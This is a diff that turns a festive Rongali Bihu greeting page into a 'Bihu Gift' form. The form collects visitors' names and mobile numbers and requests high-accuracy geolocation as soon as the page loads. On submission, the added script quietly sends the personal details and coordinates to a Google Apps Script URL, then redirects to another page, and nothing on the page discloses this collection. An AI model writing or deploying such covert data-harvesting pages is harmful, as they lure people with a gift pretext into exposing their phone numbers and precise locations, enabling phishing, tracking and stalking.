@@ -1,71 +1,103 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Happy Bihu 🎉</title>
+  <title>বিহুৰ উপহাৰ (Bihu Gift)</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
     body {
-      margin: 0;
-      min-height: 100vh;
+      font-family: Arial;
       display: flex;
       justify-content: center;
       align-items: center;
-      background: radial-gradient(circle, orange, red);
-      font-family: 'Comic Sans MS', cursive;
+      min-height: 100vh;
+      margin: 0;
+      background: linear-gradient(135deg, blue, purple);
+    }
+    form {
+      background: aqua;
+      padding: 30px;
+      border-radius: 12px;
+      max-width: 400px;
+      width: 100%;
       text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 6px;
+      border: none;
+    }
+    button {
+      background: green;
       color: white;
+      font-size: 16px;
+      cursor: pointer;
     }
-    .box {
-      background: rgba(0,0,0,0.4);
-      padding: 40px;
-      border-radius: 20px;
-      animation: pop 1.2s ease;
-    }
-    h1 {
-      font-size: 36px;
-      margin-bottom: 10px;
-    }
-    p {
-      font-size: 18px;
-    }
-    .name {
-      color: #00ffcc;
-      font-size: 26px;
+    #status {
       font-weight: bold;
-      animation: glow 1.5s infinite alternate;
-    }
-    @keyframes pop {
-      0% { transform: scale(0.5); opacity: 0; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-    @keyframes glow {
-      from { text-shadow: 0 0 5px yellow; }
-      to { text-shadow: 0 0 20px white; }
+      margin-top: 10px;
     }
   </style>
 </head>
 
 <body>
 
-<div class="box">
-  <h1>🌸 Happy Rongali Bihu 🌸</h1>
-  <p id="nameText"></p>
-  <p>🎁 Your gift has been received successfully!</p>
-  <p>💃🕺 Celebrate with joy & happiness</p>
-  <p>— ZX Family —</p>
-</div>
+<form id="studentForm">
+  <h2> Bihu Gift 🎁 </h2>
+
+  <input type="text" name="name" placeholder="Name" required>
+  <input type="text" name="reason" placeholder="Gift type" required>
+  <input type="text" name="mobile" placeholder="Mobile Number" required>
+
+  <button type="submit">Received Gift 🎁</button>
+  <p id="status">Getting location…</p>
+</form>
 
 <script>
-  const userName = localStorage.getItem("bihuName");
+const form = document.getElementById("studentForm");
+const statusText = document.getElementById("status");
 
-  if (userName) {
-    document.getElementById("nameText").innerHTML =
-      "🎊 <span class='name'>" + userName + "</span>, Enjoy the Celebration! 🎊";
-  } else {
-    document.getElementById("nameText").innerHTML =
-      "🎊 Enjoy the Celebration! 🎊";
-  }
+let lockedPosition = null;
+
+// Get location (optional)
+navigator.geolocation.getCurrentPosition(
+  pos => {
+    lockedPosition = pos;
+    statusText.innerText = "Location captured ✔";
+  },
+  () => {
+    statusText.innerText = "ZX+++";
+    lockedPosition = null;
+  },
+  { enableHighAccuracy: true, timeout: 10000 }
+);
+
+// Submit
+form.addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const data = {
+    name: form.name.value,
+    reason: form.reason.value,
+    mobile: form.mobile.value,
+    latitude: lockedPosition ? lockedPosition.coords.latitude : "",
+    longitude: lockedPosition ? lockedPosition.coords.longitude : "",
+    accuracy: lockedPosition ? lockedPosition.coords.accuracy : ""
+  };
+
+  fetch("https://script.google.com/macros/s/AKfycbz3rQv9nyn-B_NNyy2Vyj6WN2hZcsFgpncziEsCGhn4sB-Cwm-gP52RnvphqzH1QxCL/exec", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  });
+
+  // 👉 NEW PAGE OPEN
+  window.location.href = "bihu.html";
+
+});
 </script>
 
 </body>
